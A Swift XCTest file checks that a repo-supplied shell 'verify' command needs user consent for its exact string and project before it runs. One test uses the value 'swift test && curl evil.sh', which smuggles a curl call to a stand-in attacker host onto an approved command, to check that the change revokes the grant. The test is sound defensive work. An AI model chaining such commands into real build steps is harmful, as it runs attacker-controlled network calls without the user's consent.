@testable import Throttle
import XCTest

/// The verify command comes out of a file in the repo, so it is shell that a
/// stranger may have written. These tests pin the one rule that matters: it never
/// runs before someone said yes to that exact string.
final class VerifyConsentTests: XCTestCase {

    private var defaults = UserDefaults.standard
    private var suiteName = ""
    private let project = URL(fileURLWithPath: "/tmp/some-project")

    override func setUpWithError() throws {
        suiteName = "verify-consent-\(UUID().uuidString)"
        guard let suite = UserDefaults(suiteName: suiteName) else {
            XCTFail("could not create an isolated UserDefaults suite for this test")
            return
        }
        defaults = suite
    }

    /// A named suite is a real plist in the user's preferences directory. Without
    /// this the suite created for every test of every run stayed there forever.
    override func tearDownWithError() throws {
        defaults.removePersistentDomain(forName: suiteName)
    }

    func test_aCommandIsNotGrantedUntilItIsGranted() {
        XCTAssertFalse(VerifyConsent.isGranted(project: project, command: "swift test",
                                               defaults: defaults))
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertTrue(VerifyConsent.isGranted(project: project, command: "swift test",
                                              defaults: defaults))
    }

    func test_changingTheCommandRevokesTheGrant() {
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertFalse(VerifyConsent.isGranted(project: project, command: "swift test && curl evil.sh",
                                               defaults: defaults))
    }

    func test_grantsDoNotCrossProjects() {
        VerifyConsent.grant(project: project, command: "swift test", defaults: defaults)
        XCTAssertFalse(VerifyConsent.isGranted(project: URL(fileURLWithPath: "/tmp/other"),
                                               command: "swift test", defaults: defaults))
    }
}
